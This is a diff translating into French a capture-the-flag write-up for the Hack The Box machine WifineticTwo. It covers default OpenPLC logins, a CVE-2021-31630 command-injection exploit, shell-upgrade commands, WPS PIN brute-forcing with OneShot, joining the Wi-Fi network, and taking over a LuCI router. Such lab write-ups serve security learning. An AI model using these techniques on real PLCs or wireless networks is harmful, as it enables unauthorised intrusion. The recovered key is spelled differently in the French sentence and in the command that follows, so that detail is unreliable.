@@ -15,9 +15,9 @@ type: "post"
 * OS: Linux
 ---
 
-WifineticTwo is a unique box focused on WiFi exploitation. The challenge begins with an accessible OpenPLC page using default credentials. Utilizing CVE-2021-31630, we gain an initial foothold and capture the user flag. Once inside the target system, we brute-force the WPS key, configure the wireless interface, and scan the default gateway to discover internal services. We then access the Lua Configuration Interface, set up a new password, log in via SSH, and retrieve the root flag.
+WifineticTwo est une machine unique axée sur l'exploitation WiFi. Le défi commence avec une page OpenPLC accessible à l'aide d'identifiants par défaut. En utilisant le `CVE-2021-31630`, nous obtenons un accès initial. Une fois au sein du système, nous utilisons une attaque par force brute, pour récupérer la clé WPS, configurer l'interface sans fil, et scanner la passerelle par défaut pour découvrir les services internes. Nous accédons ensuite à l'interface de configuration Lua, définissons un nouveau mot de passe, nous connectons via SSH et récupérons le drapeau root.
 
-Target IP address - `10.10.11.7`
+Adresse IP cible - `10.10.11.7`
 
 
 ## Scanning
@@ -26,7 +26,7 @@ Target IP address - `10.10.11.7`
 nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
 ```
 
-**Results**
+**Résultats**
 
 ```shell
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 16:39 CDT
@@ -128,29 +128,29 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
 ```
 
-Our scan reveals two open ports 22 (SSH) and 8080 (http-proxy).
+Notre scan révèle deux ports ouverts: 22 (SSH) et 8080 (http-proxy).
 
-## Enumeration
+## Enumération
 
-We find a login form at `http://10.10.11.7:8080` for OpenPLC Webserver.
+Nous trouvons une page de connexion à `http://10.10.11.7:8080` pour OpenPLC Webserver.
 
 ![OpenPLC login form](/images/HTB-WifineticTwo/OpenPLC-webserver.png)
 
-The default credentials allow us to login.
+Les informations d'identification par défaut nous permettent de nous connecter.
 
 ![OpenPLC default credentials](/images/HTB-WifineticTwo/openplc-creds.png)
 
-We access the Dashboard. The different sections give us some information but nothing is standing out at the moment.
+Nous accédons au tableau de bord. Les différentes sections nous donnent quelques informations mais rien d'intéressant pour l'instant.
 
 ![OpenPLC dashboard](/images/HTB-WifineticTwo/openPLC-dashboard.png)
 
-## Initial Foothold
+## Accès initial
 
-We find [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) which is a command injection vulnerability for Open PLC Webserver v3 and an exploit is available [here](https://github.com/Hunt3r0x/CVE-2021-31630-HTB).
+Nous trouvons le [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) qui est une vulnérabilité d'injection de commande pour Open PLC Webserver v3 et un exploit est disponible [ici](https://github.com/Hunt3r0x/CVE-2021-31630-HTB).
 
-> To make this exploit work you have to add the target IP as `wifinetictwo.htb` in your `/etc/hosts` file.
+> Pour que cet exploit fonctionne, vous devez mettre à jour le fichier `/etc/hosts` avec `wifinetictwo.htb`.
 
-After running the exploit we catch a shell on out listener.
+Après exécution de l'exploit, nous obtenons un shell sur notre listener.
 
 ```
 python ./exploit.py -ip <IP_ADDRESS> -p <PORT_NUMBER> -u openplc -pwd openplc
@@ -160,7 +160,7 @@ python ./exploit.py -ip <IP_ADDRESS> -p <PORT_NUMBER> -u openplc -pwd openplc
 
 ![WifineticTwo foothold](/images/HTB-WifineticTwo/foothold.png)
 
-Our shell can be upgraded with the commands below.
+Notre shell peut être amélioré à l'aide des commandes ci-dessous.
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'  
@@ -170,37 +170,39 @@ stty raw -echo; fg
 stty rows 38 columns 116
 ```
 
-We are connected as `root` and we recover the user flag in `/root`.
+Nous sommes connectés en tant que `root` et nous récupérons le drapeau utilisateur dans `/root`.
 
 ![WifineticTwo user flag](/images/HTB-WifineticTwo/user-flag.png)
 
-## Privilege Escalation
+## Escalade des privilèges
 
-It is definitely odd that we were already root for the first flag. This probably means that we need to do some kind of pivoting or access another service.
+Il est étrange que nous soyons déjà root pour le premier drapeau. Cela signifie probablement que nous devons faire une sorte de pivot ou accéder à un autre service ou hôte.
 
-The name of this box obviously points at WiFi so let's check the network interfaces with `ifconfig`.
+Le nom de cette machine évoque évidemment le WiFi, alors vérifions les interfaces réseau avec `ifconfig`.
 
 ![WifineticTwo ifconfig command](/images/HTB-WifineticTwo/ifconfig-cmd.png)
 
-We find a wireless network interface `wlan0`, we know that HTB machines are VMs and do not have internet access so this network interface probably is leveraging some WiFi virtualization.
+### Récupération de la clé WPS
 
-We can retrieve information about the wireless interface with `iw dev wlan0 scan`. In our case the scan reveals a WiFi network called `plcrouter` with a BSSID of `02:00:00:00:01:00`, it is also running `WPS: Version: 1.0`.
+Nous trouvons une interface réseau sans fil `wlan0`, nous savons que les machines HTB sont des VMs et qu'elles n'ont pas d'accès à l'internet, donc cette interface réseau tire probablement parti d'une virtualisation WiFi.
+
+Nous pouvons récupérer des informations sur l'interface sans fil avec `iw dev wlan0 scan`. Dans notre cas, le scan révèle un réseau WiFi appelé `plcrouter` avec un BSSID de `02:00:00:00:01:00`, il utilise aussi `WPS : Version : 1.0`.
 
 ![WifineticTwo iw scan](/images/HTB-WifineticTwo/iw-scan.png)
 
-After reading the [Pentesting Wifi page](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps) on HackTricks, we discovered that we can brute-force WPS keys. Our issue is that in order to use tools such as `reaver` and `bully` we need a wireless adapter (which I do not have currently). Fortunately we can also use [OneShot-C](https://github.com/nikita-yfh/OneShot-C) to perform the attack.
+Après avoir lu la page [Pentesting Wifi](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps) on HackTricks, nous apprenons qu'il est possible de faire du brute-force avec les clés WPS. Le problème est que pour utiliser des outils tels que `reaver` et `bully`, nous avons besoin d'un adaptateur sans fil (que je n'ai pas). Heureusement, nous pouvons aussi utiliser [OneShot-C](https://github.com/nikita-yfh/OneShot-C) pour effectuer l'attaque.
 
-> I ended up using the [Python version](https://github.com/kimocoder/OneShot) of OneShot because I had issues compiling the C version.
+> J'ai finalement utilisé la [version Python](https://github.com/kimocoder/OneShot) de OneShot en raison de problèmes de compilation avec la version C.
 
-We clone the repo, and send the `oneshot.py`  file to the target with `curl`.
+Nous clonons le repo, et transférons le fichier `oneshot.py` sur la cible avec `curl`.
 
 ![One-shot-py](/images/HTB-WifineticTwo/oneshot-py.png)
 
-We can see how to use the script with `python3 oneshot.py -h`.
+Nous pouvons voir comment utiliser le script avec `python3 oneshot.py -h`.
 
 ![One-shot-py help](/images/HTB-WifineticTwo/oneshot-py-help.png)
 
-We then run our attack with the command below using the interface name and the BSSID. We successfully recover the key which is `NoWWEDoKnowWhaTisReal123!`.
+Nous lançons ensuite notre attaque avec la commande ci-dessous en utilisant le nom de l'interface et le BSSID. Nous réussissons à récupérer la clé qui est `NoWEDWoKnowWhaTisReal123!`.
 
 ```
 python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
@@ -208,9 +210,11 @@ python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
 
 ![One-shot attack](/images/HTB-WifineticTwo/oneshot-attack.png)
 
-Now we need to learn how to connect to WiFi from the command line. We learn from [this thread](https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line) and [that one](https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line) that we need a configuration file.
+### Configuration de l'interface sans fil
 
-We create it with `wpa_passphrase`.
+Nous devons apprendre comment nous connecter au WiFi à partir de la ligne de commande. En combinant les informations de [cette page](https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line) and [celle-ci](https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line) nous comprenons maintenant que nous avons besoin d'un fichier de configuration.
+
+Nous le créons avec `wpa_passphrase`.
 
 ```
 wpa_passphrase 'plcrouter' 'NoWWEDoKnowWhaTisReal123!' > wpa.conf
@@ -218,7 +222,7 @@ wpa_passphrase 'plcrouter' 'NoWWEDoKnowWhaTisReal123!' > wpa.conf
 
 ![WPA config file](/images/HTB-WifineticTwo/wpa_passphrase.png)
 
-> The WPA supplicant process is responsible for managing wireless connections on Linux systems.
+> Le processus WPA supplicant est responsable de la gestion des connexions sans fil sur les systèmes Linux.
 
 ```
 wpa_supplicant -B -c wpa.conf -i wlan0
@@ -226,56 +230,57 @@ wpa_supplicant -B -c wpa.conf -i wlan0
 
 ![WPA supplicant](/images/HTB-WifineticTwo/wpa_supplicant.png)
 
-We verify the interface configuration with `iwconfig`.
+Nous vérifions la configuration de l'interface avec `iwconfig`.
 
 ![iwconfig command](/images/HTB-WifineticTwo/iwconfig.png)
 
-Using `ifconfig` we can see that the interface is up but there is no IP address configured for `wlan0`.
+En utilisant `ifconfig` nous pouvons voir que l'interface est en place mais qu'il n'y a pas d'adresse IP configurée pour `wlan0`.
 
 ![wlan0 no IP address](/images/HTB-WifineticTwo/ifconfig-noIP.png)
 
-We can manually set an IP address with 
+Nous pouvons définir manuellement une adresse IP avec 
 
 ```
 ifconfig wlan0 <IP_ADDRESS> netmask <NETWORK_MASK>
 ```
 
+**Exemple**
 ```
 ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
 ```
 
 ![ifconfig IP address](/images/HTB-WifineticTwo/ifconfig-IP.png)
 
-Now that we have our new interface properly set up let's scan it in hopes of discovering more leads.
+Maintenant que notre nouvelle interface est correctement configurée, scannons-la dans l'espoir de découvrir d'autres pistes.
 
-We download the nmap binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and send it to the target. Make sure to make it executable with `chmod +x nmap`.
+Nous téléchargeons le binaire nmap depuis [ce dépôt github](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) et l'envoyons à la cible. Assurez-vous de le rendre exécutable avec `chmod +x nmap`.
 
 ```
 ./nmap -sn 192.168.1.0/24
 ```
 
-We see the default gateway `192.168.1.1` and our configured address `192.168.1.50` among others. 
+Nous voyons la passerelle par défaut `192.168.1.1` et notre adresse configurée `192.168.1.50` parmi d'autres adresses. 
 
 ![nmap scan configured IP address](/images/HTB-WifineticTwo/nmap_scan.png)
 
-After scanning the default gateway we discover more services, we will need some tunneling to access them (I used chisel for this box).
+Après avoir scanné la passerelle par défaut, nous découvrons d'autres services, nous aurons besoin d'un tunnel pour y accéder (j'ai utilisé [chisel](https://github.com/jpillora/chisel)).
 
 ![nmap default gateway scan](/images/HTB-WifineticTwo/nmap-internal.png)
 
-We find a page with a title of `ap - LuCI`, which is referring to the [Lua Configuration Interface](https://launchpad.net/luci), "a collection of free Lua software for embedded devices." 
+Nous trouvons une page intitulée `ap - LuCI`, qui fait référence à [Lua Configuration Interface](https://launchpad.net/luci), "une collection de logiciels Lua libres pour les appareils embarqués (embedded devices)". 
 
 ![LuCI page](/images/HTB-WifineticTwo/LuCI.png)
 
-For the authentication `root` will work for the password and we are asked to configure a new one.
+Pour l'authentification, `root` fonctionnera pour le mot de passe et il nous est demandé d'en configurer un nouveau après s'être connecté.
 
-Under `System` --> `Administration` we notice that we have the option to login with a password. 
+Sous `System` --> `Administration` nous remarquons que nous avons l'option de nous connecter avec un mot de passe via SSH. 
 
 ![LuCI SSH access](/images/HTB-WifineticTwo/LuCI-SSH-access.png)
 
-With our newly configured password we login via SSH and find the root flag.
+Avec notre mot de passe nouvellement configuré, nous nous connectons via SSH et trouvons le drapeau root.
 
 ![Root flag](/images/HTB-WifineticTwo/root-flag.png)
 
-## Closing Words
+## Mots de fin
 
-I enjoyed this box as it was a nice change of pace from the usual web-based exploitation, I hope I was able to be helpful with this write up. Thank you for checking my blog!
+J'ai apprécié cette machine qui m'a permis de changer de la routine habituelle de l'exploitation web, et j'espère que cet article vous a été utile. Merci d'avoir consulté mon blog !
